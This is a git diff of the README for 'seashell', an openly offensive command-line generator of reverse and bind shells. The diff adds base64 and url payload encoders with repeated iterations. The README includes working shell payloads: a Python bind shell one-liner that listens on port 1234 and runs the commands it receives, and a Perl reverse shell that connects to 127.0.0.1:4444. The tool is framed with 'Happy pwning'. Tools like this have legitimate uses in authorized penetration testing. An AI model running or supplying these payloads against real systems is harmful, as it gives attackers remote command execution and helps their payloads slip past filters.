@@ -14,15 +14,20 @@ $ git clone https://github.com/lil-skelly/seashell
 [ ]
 $ cd seashell && python3 -m pip install .
 ```
+## NEW: Payload encoders
+With this [commit](https://github.com/lil-skelly/seashell/commit/19b1796355ba3eae6b23317ef6dbc5cc4ffae32e), seashell now added support for payload encoders.
+As of now there are 2 encoders available: **base64** and **url**. You can also specify the number of iterations the encoder will run through your payload using the `--iterations` argument.
 
-- Added substitute_payload to configure payload, repaced -S with -T (type) and added custom shell support (-S).
-- Updated README.md 
+[Payload encoding with iterations PoC](https://github.com/user-attachments/assets/7155e970-fc7e-462f-b582-0bbbf23ef44e)
+
+
 # Usage
 ```bash
 usage: python3 -m seashell [-h] [--verbose] [-os {windows,mac,linux}] [-ip IP] [-p PORT]
                            [--type {reverse,bind,msfvenom,hoaxshell,listeners}]
                            [--shell {sh,/bin/sh,bash,/bin/bash,cmd,powershell,pwsh,ash,bsh,csh,ksh,zsh,pdksh,tcsh,mksh,dash}]
-                           [-P PAYLOAD] [--interactive] [--output OUTPUT]
+                           [-P PAYLOAD] [--interactive] [--output OUTPUT] [--encoder {base64,url}]
+                           [--iterations {1,2,3,4,5}]
                            [term]
 
 Seashell is a CLI 'reverse' shell generator utility. Happy hacking!
@@ -32,7 +37,7 @@ positional arguments:
 
 options:
   -h, --help            show this help message and exit
-  --verbose, -V         Sets logging level to [DEBUG]
+  --verbose, -V, -v     Sets logging level to [DEBUG]
   -os {windows,mac,linux}, -o {windows,mac,linux}
                         Filters results for [given] operating system
   -ip IP                Target IP
@@ -45,7 +50,11 @@ options:
                         metasploit payload to use for listener [msfconsole]
   --interactive, -i     Enables interactive mode. Any arguments besides -V will be ignored!
   --output OUTPUT, -O OUTPUT
-                        Store payload in a file
+                        Store payload to file
+  --encoder {base64,url}, -e {base64,url}
+                        The encoder to use
+  --iterations {1,2,3,4,5}, -I {1,2,3,4,5}
+                        The number of times to encode the payload
 ```
 
 Seashell filters your results based on the shell type and OS specified. 
@@ -66,12 +75,12 @@ Seashell will then select the appropriate payload.
 If you want to store the generated shell in a file, you can use the `--output/-O` argument in both modes.
 
 ### Special arguments
-- You can specify a *shell* to use (i.e `/bin/bash` or `zsh`) with the `-S/--shell <SHELL>` command line argument.
-- You can specify a metasploit payload to use in certain payloads with the `-P <PAYLOAD>` argument.
+- `-S/--shell <SHELL>`: You can specify a *shell* to use (i.e `/bin/bash` or `zsh`) as a command line argument
+- `-P <PAYLOAD>` You can specify a metasploit payload to use in certain payloads as a command line argument.
 
 ## Examples:
 
-- Example 1 (manual mode)
+- Manual mode
 ```bash
 $ python -m seashell -ip localhost -p 1234 -T bind python
 [+] Welcome to the sea of shells! Happy pwning >:)
@@ -84,7 +93,7 @@ $ python -m seashell -ip localhost -p 1234 -T bind 70
 python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();
 while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
 ```
-- Example 2 (interactive mode):
+- Interactive mode:
 ```bash
 $ python -m seashell -i
 [+] Welcome to the sea of shells! Happy pwning >:)
@@ -102,7 +111,7 @@ $ python -m seashell -i
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 
-- Example 3 (payload listing in manual mode)
+- Payload listing in manual mode
 ```bash
 $ python -m seashell -ip localhost -os windows -T hoaxshell list
 [+] Welcome to the sea of shells! Happy pwning >:)
